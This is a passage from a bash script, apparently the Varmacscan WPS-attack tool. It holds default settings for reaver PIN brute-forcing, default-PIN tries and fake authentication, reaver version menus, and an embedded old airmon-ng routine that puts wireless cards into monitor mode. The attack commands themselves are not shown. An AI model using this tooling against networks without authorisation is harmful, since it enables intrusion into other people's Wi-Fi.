#!/bin/bash

#There are no secrets but the secrets that keep themselves

#Another way of checking

#echo " Check for the installation of Eterm."

#hash Eterm &> /dev/null

#       if [[ $? -ne 0 ]] ;then  # checks exit code of last command ie did it work?
#            echo -e "$warn\n???!!!Eterm MAY NOT BE Installed!!!???"
#            echo -e "$inp Insure Eterm is installed before continuing"
#            sleep 5
#        else 
#            echo -e "$inp OK Eterm is installed!$txtrst"
#            sleep 5
#        fi

#################
#Default Variables
#Debug 0=off 1=on
DEBUG=0

washtime=300

reavertime=180

ROUTSEL=n

WHITEL=n

USE_PROBE=y

USE_REF=n

REAV_ASSOC=n

PREVPIN=y

PREVTIME=600

DEF00PIN=y

DEF00TIME=120

DEF70PIN=y

DEF70TIME=120

DEFWPIN=n

DEFWTIME=120

FAKEAUTH=y

FAKETYPE=1

MACFIL=n

SELPIN=n

SELNUM=12345670

SELTIME=120

STOPAIR=60

if [[ $DEBUG == 1 ]]; then
washtime=300

washtime=120

reavertime=60

ROUTSEL=n

WHITEL=n

USE_PROBE=y

USE_REF=n

REAV_ASSOC=n

PREVPIN=y

PREVTIME=60

DEF00PIN=y

DEF00TIME=60

DEF70PIN=y

DEF70TIME=60

DEFWPIN=y

DEFWTIME=60

FAKEAUTH=y

FAKETYPE=1

MACFIL=n

SELPIN=n

SELNUM=12345670

SELTIME=120

STOPAIR=60

fi

# Reaver Reaver v1.5.3  doesnot support
# reaver 	-a, --auto Auto detect the best advanced options for the target AP
# wash doesnot include -C, --ignore-fcs, Ignore frame checksum errors

#reaver -h | tee /tmp/reaverout.txt; clear

#sleep 3

#reaverout=$(grep -i "reaver" /tmp/reaverout.txt)

# End Default Variables

########
#~~~~~~~~~~~~~~~~~~start  reaver 1.63 type start~~~~~~~~~~#

REVPIX_TYPETEST=ZZZ

REVPIXSEL_fn()

{

until [ $REVPIX_TYPETEST == y ] || [ $REVPIX_TYPETEST == Y ]; do  

clear
echo ""
echo ""
echo -e "$info$bold                    Reaver 1.63 Install$warn"
echo -e "                    $undr                   $norm"
echo ""
echo -e "$info     Reaver v1.63 installed in Kali linux 2017 R2 has different text output. $txtrst"
echo ""
echo -e "$info     Users note:  Some versions of reaver between 1.52 and 1.63 do not output"
echo -e "$info  data required by pixiewps. Varmacscan has been tested under reaver v1.52"
echo -e "$info  and reaver v1.63 ONLY!!!." 

echo ""
echo -e "$inp     Enter$yel (1)$inp if using program lower then reaver v1.63"
echo -e "$inp  Enter$yel (2)$inp if using reaver v1.63 or higher.$txtrst" 
echo -e ""	
	read REVPIX_TYPE

	while true

	do

   echo ""
   echo -e  "$inp      You entered$yel $REAVER_TYPE$inp  Select$yel (y/Y)$inp to continue."
   echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
	read REVPIX_TYPETEST

	case $REVPIX_TYPETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done
	clear
		done

if  [[ $REVPIX_TYPE -ne 1 ]] && [[ $REVPIX_TYPE -ne 2 ]]; then

	echo ""
	echo ""
	echo -e  "$warn  !!!Enter$yel 1$warn or$yel 2$warn ONLY - try again!!!$txtrst"
	REVPIX_TYPETEST=ZZZ
	sleep 3
	REVPIXSEL_fn

	fi

}

##################

#~~~~~~~~~~~~~~~~~~start  reaver type start~~~~~~~~~~~~~~~~~#

REAVER_TYPETEST=ZZZ

REAVERSEL_fn()

{

until [ $REAVER_TYPETEST == y ] || [ $REAVER_TYPETEST == Y ]; do  

clear
echo ""
echo ""
echo -e "$info$bold                    Reaver Program Installed$warn"
echo -e "                    $undr                        $norm"
echo ""
echo -e "$info     Reaver v1.5.3 installed in Kali linux 2017 R1 doesnot support: $txtrst"
echo ""
echo -e "       -a, --auto Auto detect the best advanced options for the target AP"
echo ""
echo -e "$info     Wash doesnot support: $txtrst"
echo ""
echo -e "       -C, --ignore-fcs, Ignore frame checksum errors"
echo ""
echo -e "$inp     Select the reaver program being used?"
echo -e "$info  If unsure open a terminal window type reaver --help and look"
echo -e "$info  for -a --auto in menu listing. If missing select 2."
echo ""
echo -e "$inp     Enter$yel (1)$inp if using program lower then reaver v1.5.3 "
echo -e "$inp  Enter$yel (2)$inp if using reaver v1.5.3 or higher.$txtrst" 
echo -e ""	
	read REAVER_TYPE

	while true

	do

   echo ""
   echo -e  "$inp      You entered$yel $REAVER_TYPE$inp  Select$yel (y/Y)$inp to continue."
   echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
	read REAVER_TYPETEST

	case $REAVER_TYPETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done
	clear
		done

if  [[ $REAVER_TYPE -ne 1 ]] && [[ $REAVER_TYPE -ne 2 ]]; then

	echo ""
	echo ""
	echo -e  "$warn  !!!Enter$yel 1$warn or$yel 2$warn ONLY - try again!!!$txtrst"
	REAVER_TYPETEST=ZZZ
	sleep 3
	REAVERSEL_fn

	fi

}

##################

# Note to Prog MTeams. As a method to avoid the use of airmon-ng check maynot work on all OS
# The following switch is placed to allow the use a choice

#~~~~~~~~~~~~~~~~~~start  airmon-ng old  start~~~~~~~~~~~~~~~~~#
airmon-old_fn()

{
#!/bin/sh

USERID=""
IFACE=""
KISMET=/etc/kismet/kismet.conf
CH=$3; [ x$3 = "x" ] && CH=10
IFACE_FOUND="false"
MADWIFI=0
MAC80211=0
USE_IW=0
IW_SOURCE="http://wireless.kernel.org/download/iw/iw-0.9.15.tar.bz2"
IW_ERROR=""
UDEV_ISSUE=0

if [ -f "`which iw 2>&1`" ]
then
	USE_IW=1
fi

if [ "x$MON_PREFIX"="x" ]
then
MON_PREFIX="mon"
fi

PROCESSES="wpa_action\|wpa_supplicant\|wpa_cli\|dhclient\|ifplugd\|dhcdbd\|dhcpcd\|NetworkManager\|knetworkmanager\|avahi-autoipd\|avahi-daemon\|wlassistant\|wifibox"
PS_ERROR="invalid"

usage() {
	printf "usage: `basename $0` <start|stop|check> <interface> [channel or frequency]\n"
	echo
	exit
}

startStdIface() {
	iwconfig $1 mode monitor >/dev/null 2>&1
	if [ ! -z $2 ]
	then
	    if [ $2 -lt 1000 ]
	    then
		iwconfig $1 channel $2 >/dev/null 2>&1
	    else
		iwconfig $1 freq "$2"000000 > /dev/null 2>&1
	    fi
	fi
	iwconfig $1 key off >/dev/null 2>&1
	ifconfig $1 up
	printf " (monitor mode enabled)"
}


stopStdIface() {
	ifconfig $1 down >/dev/null 2>&1
	iwconfig $1 mode Managed >/dev/null 2>&1
	ifconfig $1 down >/dev/null 2>&1
	printf " (monitor mode disabled)"
}

getModule() {
    if [ -f "/sys/class/net/$1/device/driver/module/srcversion" ]
    then
        srcver1=`cat "/sys/class/net/$1/device/driver/module/srcversion"`
        for j in `lsmod | awk '{print $1}' | grep -v "^Module$"`
        do
            srcver2="`modinfo $j 2>/dev/null | grep srcversion | awk '{print $2}'`"
            if [ $srcver1 = "$srcver2" ]
            then
                MODULE=$j
                break
            fi
        done
    else
        MODULE=""
    fi
#    return 0
}

getDriver() {
   if [ -e "/sys/class/net/$1/device/driver" ]
   then
       DRIVER="`ls -l "/sys/class/net/$1/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`"
       BUS="`ls -l "/sys/class/net/$1/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)\/.*\/.*$/\1/'`"
   else
       DRIVER=""
       BUS=""
   fi
   if [ x$(echo $DRIVER | grep ath5k) != "x" ]
   then
       DRIVER="ath5k"
   fi
   if [ x$(echo $DRIVER | grep ath9k) != "x" ]
   then
       DRIVER="ath9k"
   fi
}

scanProcesses() {
    match=`ps -A -o comm= | grep $PROCESSES | grep -v grep | wc -l`
    if [ $match -gt 0 -a x"$1" != xkill ]
    then
        printf "\n\n"
        echo "Found $match processes that could cause trouble."
        echo "If airodump-ng, aireplay-ng or airtun-ng stops working after"
        echo "a short period of time, you may want to kill (some of) them!"
        echo -e "\nPID\tName"
    else
        if [ x"$1" != xkill ]
        then
            return
        fi
    fi

    if [ $match -gt 0 -a x"$1" = xkill ]
    then
        echo "Killing all those processes..."
    fi

    i=1
    while [ $i -le $match ]
    do
        pid=`ps -A -o pid= -o comm= | grep $PROCESSES | grep -v grep | head -n $i | tail -n 1 | awk '{print $1}'`
        pname=`ps -A -o pid= -o comm= | grep $PROCESSES | grep -v grep | head -n $i | tail -n 1 | awk '{print $2}'`
        if [ x"$1" != xkill ]
        then
            printf "$pid\t$pname\n"
        else
            kill $pid
        fi
        i=$(($i+1))
    done
}

checkProcessesIface() {
    if [ x"$1" = x ]
    then
        return
    fi

    match2=`ps -o comm= -p 1 2>&1 | grep $PS_ERROR | grep -v grep | wc -l`
    if [ $match2 -gt 0 ]
    then
	return
    fi

    for i in `ps auxw | grep $1 | grep -v "grep" | grep -v "airmon-ng" | awk '{print $2}'`
    do
        pname=`ps -o comm= -p $i`
        echo "Process with PID $i ($pname) is running on interface $1"
    done
}

getStack() {
    if [ x"$1" = x ]
    then
        return
    fi

    if [ -d /sys/class/net/$1/phy80211/ ]
    then
        MAC80211=1
    else
        MAC80211=0
    fi
}

#you need to run getDriver $iface prior to getChipset
getChipset() {
    if [ x"$1" = x ]
    then
        return
    fi

    CHIPSET="Unknown "

    if [ x$DRIVER = "xOtus" -o x$DRIVER = "xarusb_lnx" -o x$DRIVER = "xar9170" ]
    then
	CHIPSET="AR9001U"
    fi

    if [ x$DRIVER = "xzd1211rw" -o x$DRIVER = "xzd1211rw_mac80211" ]
    then
        CHIPSET="ZyDAS 1211"
    fi

    if [ x$DRIVER = "xacx" -o x$DRIVER = "xacx-mac80211" -o x$DRIVER = "xacx1xx" ]
    then
        CHIPSET="TI ACX1xx"
    fi

    if [ x$DRIVER = "adm8211" ]
    then
        CHIPSET="ADMtek 8211"
    fi

    if [ x$DRIVER = "xat76_usb" ]
    then
        CHIPSET="Atmel   "
    fi

    if [ x$DRIVER = "xb43" -o x$DRIVER = "xb43legacy" -o x$DRIVER = "xbcm43xx" ]
    then
        CHIPSET="Broadcom"
    fi

    if [ x$DRIVER = "xprism54" -o x$DRIVER = "xp54pci" -o x$DRIVER = "xp54usb" ]
    then
        CHIPSET="PrismGT "
    fi

    if [ x$DRIVER = "xhostap" ]
    then
        CHIPSET="Prism 2/2.5/3"
    fi

    if [ x$DRIVER = "xr8180" -o x$DRIVER = "xrtl8180" ]
    then
        CHIPSET="RTL8180/RTL8185"
    fi

    if [ x$DRIVER = "xr8187" -o x$DRIVER = "xrtl8187" ]
    then
        CHIPSET="RTL8187 "
    fi

    if [ x$DRIVER = "xrt2570" -o x$DRIVER = "xrt2500usb" ]
    then
        CHIPSET="Ralink 2570 USB"
    fi

    if [ x$DRIVER = "xrt2400" -o x$DRIVER = "xrt2400pci" ]
    then
        CHIPSET="Ralink 2400 PCI"
    fi

    if [ x$DRIVER = "xrt2500" -o x$DRIVER = "xrt2500pci" ]
    then
        CHIPSET="Ralink 2560 PCI"
    fi

    if [ x$DRIVER = "xrt61" -o x$DRIVER = "xrt61pci" ]
    then
        CHIPSET="Ralink 2561 PCI"
    fi

    if [ x$DRIVER = "xrt73" -o x$DRIVER = "xrt73usb" ]
    then
        CHIPSET="Ralink 2573 USB"
    fi

    if [ x$DRIVER = "xipw2100" ]
    then
        CHIPSET="Intel 2100B"
    fi

    if [ x$DRIVER = "xipw2200" ]
    then
        CHIPSET="Intel 2200BG"
    fi

    if [ x$DRIVER = "xipw3945" -o x$DRIVER = "xipwraw" -o x$DRIVER = "xiwl3945" ]
    then
        CHIPSET="Intel 3945ABG"
    fi

    if [ x$DRIVER = "xipw4965" -o x$DRIVER = "xiwl4965" ]
    then
        CHIPSET="Intel 4965AGN"
    fi

    if [ x$DRIVER = "xiwlagn" ]
    then
        CHIPSET="Intel 4965/5xxx"
    fi

    if [ x$DRIVER = "xath_pci" -o x$DRIVER = "xath5k" -o x$DRIVER = "xath9k" ]
    then
        CHIPSET="Atheros "
    fi

    if [ x$DRIVER = "xorinoco" ]
    then
        CHIPSET="Hermes/Prism"
    fi
}

getPhy() {
    PHYDEV=""
    if [ x"$1" = x ]
    then
        return
    fi

    if [ x$MAC80211 = "x" ]
    then
        return
    fi

    PHYDEV="`ls -l "/sys/class/net/$1/phy80211" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`"
}

getNewMon() {
    i=0

    while [ -d /sys/class/net/$MON_PREFIX$i/ ]
    do
        i=$(($i+1))
    done

    MONDEV="$MON_PREFIX$i"
}

if [ x"`which id 2> /dev/null`" != "x" ]
then
	USERID="`id -u 2> /dev/null`"
fi

if [ x$USERID = "x" -a x$UID != "x" ]
then
	USERID=$UID
fi

if [ x$USERID != "x" -a x$USERID != "x0" ]
then
	echo Run it as root ; exit ;
fi

iwpriv > /dev/null 2> /dev/null ||
  { echo Wireless tools not found ; exit ; }

if [ x"$1" = xcheck ] || [ x"$1" = xstart ]
then
    scanProcesses
    for iface in `iwconfig 2>/dev/null | egrep '(IEEE|ESSID|802\.11|WLAN)' | sed 's/^\([a-zA-Z0-9_]*\) .*/\1/' | grep -v wifi`
    do
#         getModule $iface
#         getDriver $iface
        checkProcessesIface $iface
    done

    if [ x"$2" = xkill ]
    then
        scanProcesses "$2"
    fi
    if [ x"$1" = xcheck ]
    then
        exit
    fi
fi

printf "\n\n"

if [ $# -ne "0" ]
then
    if [ x$1 != "xstart" ] && [ x$1 != "xstop" ]
    then
        usage
    fi

    if [ x$2 = "x" ]
    then
        usage
    fi
fi

SYSFS=0
if [ -d /sys/ ]
then
    SYSFS=1
fi

printf "Interface\tChipset\t\tDriver\n\n"


for iface in `ifconfig -a 2>/dev/null | egrep UNSPEC | sed 's/^\([a-zA-Z0-9_]*\) .*/\1/'`
do

 if [ x"`iwpriv $iface 2>/dev/null | grep ipwraw-ng`" != "x" ]
 then
        printf "$iface\t\tIntel 3945ABG\tipwraw-ng"
        if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
        then
                cp $KISMET~ $KISMET 2>/dev/null &&
                echo "source=ipw3945,$iface,Centrino_abg" >>$KISMET
                startStdIface $iface $CH
                iwconfig $iface rate 1M 2> /dev/null >/dev/null
                iwconfig $iface txpower 16 2> /dev/null >/dev/null
        fi
        if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
        then
                stopStdIface $iface
                iwconfig $iface txpower 15 2> /dev/null >/dev/null
                iwconfig $iface rate 54M 2> /dev/null >/dev/null
        fi
        echo
        continue
 fi

 if [ -e "/proc/sys/dev/$iface/fftxqmin" ]
 then
    MADWIFI=1
    ifconfig $iface up
    printf "$iface\t\tAtheros\t\tmadwifi-ng"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        IFACE=`wlanconfig ath create wlandev $iface wlanmode monitor -bssid | grep ath`
        cp $KISMET~ $KISMET 2>/dev/null &&
        echo "source=madwifi_g,$iface,Atheros" >>$KISMET
        ifconfig $iface up 2>/dev/null >/dev/null
        if [ $CH -lt 1000 ]
        then
            iwconfig $IFACE channel $CH 2>/dev/null >/dev/null
        else
            iwconfig $IFACE freq "$CH"000000 2>/dev/null >/dev/null
        fi
        ifconfig $IFACE up 2>/dev/null >/dev/null
        UDEV_ISSUE=$?
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
            echo "$iface does not support 'stop', do it on ath interface"
    fi
    echo
    continue
 fi
done

if [ $MADWIFI -eq 1 ]
then
	sleep 1s
fi

for iface in `iwconfig 2>/dev/null | egrep '(IEEE|ESSID|802\.11|WLAN)' | sed 's/^\([a-zA-Z0-9_]*\) .*/\1/' | grep -v wifi`
do
 getModule  $iface
 getDriver  $iface
 getStack   $iface
 getChipset $DRIVER


 if [ x$MAC80211 = "x1" ]
 then
    getPhy $iface
    getNewMon
    printf "$iface\t\t$CHIPSET\t$DRIVER - [$PHYDEV]"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        if [ $USE_IW = 1 ]
        then
            IW_ERROR=`iw dev $iface interface add $MONDEV type monitor 2>&1 | grep "nl80211 not found"`
            if [ x$IW_ERROR = "x" ]
            then
                sleep 1s
		if [ ! -z $3 ]
                then
            	    if [ $3 -lt 1000 ]
            	    then
                	iwconfig $MONDEV channel $3 >/dev/null 2>&1
            	    else
                	iwconfig $MONDEV freq "$3"000000 >/dev/null 2>&1
            	    fi
            	fi
                ifconfig $MONDEV up
                printf "\n\t\t\t\t(monitor mode enabled on $MONDEV)"
            else
                if [ -f /sys/class/ieee80211/"$PHYDEV"/add_iface ]
                then
                    echo -n "$MONDEV" > /sys/class/ieee80211/"$PHYDEV"/add_iface
                    sleep 1s
                    if [ $3 -lt 1000 ]
                    then
                        iwconfig $MONDEV mode Monitor channel $3 >/dev/null 2>&1
                    else
                        iwconfig $MONDEV mode Monitor freq "$3"000000 >/dev/null 2>&1
                    fi
                    ifconfig $MONDEV up
                    printf "\n\t\t\t\t(monitor mode enabled on $MONDEV)"
                else
                    printf "\n\nERROR: nl80211 support is disabled in your kernel.\nPlease recompile your kernel with nl80211 support enabled.\n"
                fi
            fi
        else
            if [ -f /sys/class/ieee80211/"$PHYDEV"/add_iface ]
            then
                echo -n "$MONDEV" > /sys/class/ieee80211/"$PHYDEV"/add_iface
                sleep 1s
                if [ $3 -lt 1000 ]
                then
                    iwconfig $MONDEV mode Monitor channel $3 >/dev/null 2>&1
                else
                    iwconfig $MONDEV mode Monitor freq "$3"000000 >/dev/null 2>&1
                fi
                ifconfig $MONDEV up
                printf "\n\t\t\t\t(monitor mode enabled on $MONDEV)"
            else
                printf "\n\nERROR: Neither the sysfs interface links nor the iw command is available.\nPlease download and install iw from\n$IW_SOURCE\n"
            fi
        fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
        z="`echo $iface | cut -b -${#MON_PREFIX}`"
        if [ x$z = "x$MON_PREFIX" ]
        then
            if [ $USE_IW = 1 ]
            then
                IW_ERROR=`iw dev "$iface" interface del 2>&1 | grep "nl80211 not found"`
                if [ x$IW_ERROR = "x" ]
                then
                    printf " (removed)"
                else
                    if [ -f /sys/class/ieee80211/"$PHYDEV"/remove_iface ]
                    then
                        echo -n "$iface" > /sys/class/ieee80211/"$PHYDEV"/remove_iface
                        printf " (removed)"
                    else
                        printf "\n\nERROR: nl80211 support is disabled in your kernel.\nPlease recompile your kernel with nl80211 support enabled.\n"
                fi
                fi
            else
                if [ -f /sys/class/ieee80211/"$PHYDEV"/remove_iface ]
                then
                    echo -n "$iface" > /sys/class/ieee80211/"$PHYDEV"/remove_iface
                    printf " (removed)"
                else
                    printf "\n\nERROR: Neither the sysfs interface links nor the iw command is available.\nPlease download and install iw from\n$IW_SOURCE\n"
                fi
	    fi
        else
            ifconfig $iface down
            iwconfig $iface mode managed
            printf "\n\t\t\t\t(monitor mode disabled)"
        fi
    fi
    echo
    continue
 fi


 if [ x$DRIVER = "xorinoco" ] || [ x"`iwpriv $iface 2>/dev/null | grep get_rid`" != "x" ] || [ x"`iwpriv $iface 2>/dev/null | grep dump_recs`" != "x" ]
 then
    printf "$iface\t\tHermesI\t\torinoco"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        cp $KISMET~ $KISMET 2>/dev/null &&
        echo "source=orinoco,$iface,HermesI" >>$KISMET
        if [ $CH -lt 1000 ]
        then
            iwconfig $iface mode Monitor channel $CH >/dev/null 2>&1
        else
            iwconfig $iface mode Monitor freq "$CH"000000 >/dev/null 2>&1
        fi
        iwpriv $iface monitor 1 $CH >/dev/null 2>&1
        ifconfig $iface up
        printf " (monitor mode enabled)"
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
        ifconfig $iface down
        iwpriv $iface monitor 0 >/dev/null 2>&1
        iwconfig $iface mode Managed >/dev/null 2>&1
        printf " (monitor mode disabled)"
    fi
    echo
    continue
 fi


 if [ x$DRIVER = "xipw2100" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_crc_check`" != "x" ]
 then
    printf "$iface\t\tIntel 2100B\tipw2100"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        cp $KISMET~ $KISMET 2>/dev/null &&
        echo "source=ipw2100,$iface,Centrino_b" >>$KISMET
        startStdIface $iface $CH
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
        stopStdIface $iface
    fi
    echo
    continue
 fi


 if [ x$DRIVER = "xarusb_lnx" ] || [ x$DRIVER = "Otus" ]
 then
    printf "$iface\t\tAR9001USB\tOtus"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
	echo "Monitor mode not yet supported"
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
	stopStdIface $iface
    fi
    echo
    continue
 fi  

 if [ x$DRIVER = "xipw2200" ] || [ x"`iwpriv $iface 2>/dev/null | grep sw_reset`" != "x" ]
 then
    MODINFO=`modinfo ipw2200  2>/dev/null | awk '/^version/ {print $2}'`
    if { echo "$MODINFO" | grep -E '^1\.0\.(0|1|2|3)$' ; }
    then
    	echo "Monitor mode not supported, please upgrade"
    else
	printf "$iface\t\tIntel 2200BG\tipw2200"
	if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
	then
	    cp $KISMET~ $KISMET 2>/dev/null &&
	    echo "source=ipw2200,$iface,Centrino_g" >>$KISMET
	    startStdIface $iface $CH
	fi
	if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
	then
	    stopStdIface $iface
	fi

    	if { echo "$MODINFO" | grep -E '^1\.0\.(5|7|8|11)$' ; }
	then
		printf " (Warning: bad module version, you should upgrade)"
	fi
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xcx3110x" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_backscan`" != "x" ]
 then
     printf "$iface\t\tNokia 770\t\tcx3110x"
     if [ x$1 = "xstart" ] || [ x$1 = "xstop" ]
     then
     	printf " (Enable/disable monitor mode not yet supported)"
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xipw3945" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_preamble | grep -v set_crc_check`" != "x" ]
  then
        printf "$iface\t\tIntel 3945ABG\tipw3945"
        if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
         then
                cp $KISMET~ $KISMET 2>/dev/null &&
                echo "source=ipw3945,$iface,Centrino_g" >>$KISMET
                startStdIface $iface $CH
        fi
        if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
         then
                stopStdIface $iface
        fi
        echo
        continue
 fi


 if [ x"`iwpriv $iface 2>/dev/null | grep inact_auth`" != "x" ]
 then
     if [ -e "/proc/sys/net/$iface/%parent" ]
     then
        printf "$iface\t\tAtheros\t\tmadwifi-ng VAP (parent: `cat /proc/sys/net/$iface/%parent`)"
	if [ x$2 = x$iface ] && [ x$1 = "xstop" ]
	then
		wlanconfig $iface destroy
		printf " (VAP destroyed)"
	fi
	if [ x$1 = "xstart" ]
	then
		if [ $iface = "$IFACE" ]
		then
			printf " (monitor mode enabled)"
		fi
		if [ x$2 = x$iface ]
		then
			printf " (VAP cannot be put in monitor mode)"
		fi
	fi

	echo ""
        continue

     fi
     printf "$iface\t\tAtheros\t\tmadwifi"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=madwifi_g,$iface,Atheros" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xprism54" ] || [ x"`iwpriv $iface 2>/dev/null | grep getPolicy`" != "x" ]
 then
     printf "$iface\t\tPrismGT\t\tprism54"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=prism54g,$iface,Prism54" >>$KISMET
         ifconfig $iface up
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         iwpriv $iface set_prismhdr 1 >/dev/null 2>&1
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xhostap" ] || [ x"`iwpriv $iface 2>/dev/null | grep antsel_rx`" != "x" ]
 then
     printf "$iface\t\tPrism 2/2.5/3\tHostAP"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=hostap,$iface,Prism2" >>$KISMET
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         iwpriv $iface monitor_type 1 >/dev/null 2>&1
         ifconfig $iface up
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xwlan-ng" ] || [ x"`wlancfg show $iface 2>/dev/null | grep p2CnfWEPFlags`" != "x" ]
 then
     printf "$iface\t\tPrism 2/2.5/3\twlan-ng"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=wlanng,$iface,Prism2" >>$KISMET
         wlanctl-ng $iface lnxreq_ifstate ifstate=enable >/dev/null
         wlanctl-ng $iface lnxreq_wlansniff enable=true channel=$CH \
                           prismheader=true wlanheader=false \
                           stripfcs=true keepwepflags=true >/dev/null
         echo p2CnfWEPFlags=0,4,7 | wlancfg set $iface
         ifconfig $iface up
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         ifconfig $iface down
         wlanctl-ng $iface lnxreq_wlansniff enable=false  >/dev/null
         wlanctl-ng $iface lnxreq_ifstate ifstate=disable >/dev/null
         printf " (monitor mode disabled)"
     fi
     echo
     continue
 fi


 if [ x$SYSFS = "x" ] && [ x"`iwpriv $iface 2>/dev/null | grep get_RaAP_Cfg`" != "x" ]
 then
    if [ x"`iwconfig $iface | grep ESSID | awk -F\  '{ print $2}' | grep -i rt61`" != "x" ]
    then
    	printf "$iface\t\tRalink 2561 PCI\trt61"
    fi

    if [ x"`iwconfig $iface | grep ESSID | awk -F\  '{ print $2}' | grep -i rt73`" != "x" ]
    then
        printf "$iface\t\tRalink 2573 USB\trt73"
    fi

    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
         iwpriv $iface rfmontx 1
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi
    echo
    continue

 fi


 if [ x$DRIVER = "xrt61" ]
 then
    printf "$iface\t\tRalink 2561 PCI\trt61"

    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
         iwpriv $iface rfmontx 1
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi    
    echo
    continue

 fi


 if [ x$DRIVER = "xrt73" ]
 then
    printf "$iface\t\tRalink 2573 USB\trt73"

    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
         iwpriv $iface rfmontx 1
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi    
    echo
    continue

 fi


 if [ x$DRIVER = "xrt2500" ] || [ x"`iwpriv $iface 2>/dev/null | grep bbp`" != "x" ]
 then
     printf "$iface\t\tRalink 2560 PCI\trt2500"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt2500,$iface,Ralink_g" >>$KISMET
         iwconfig $iface mode ad-hoc 2> /dev/null >/dev/null
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xrt2570" ] || [ x"`iwpriv $iface 2>/dev/null | grep wpapsk`" != "x" ] && [ x"`iwpriv $iface 2>/dev/null | grep get_RaAP_Cfg`" = "x" ]
 then
     printf "$iface\t\tRalink 2570 USB\trt2570"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt2500,$iface,Ralink_g" >>$KISMET
         iwconfig $iface mode ad-hoc 2> /dev/null >/dev/null
         startStdIface $iface $CH
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
     fi
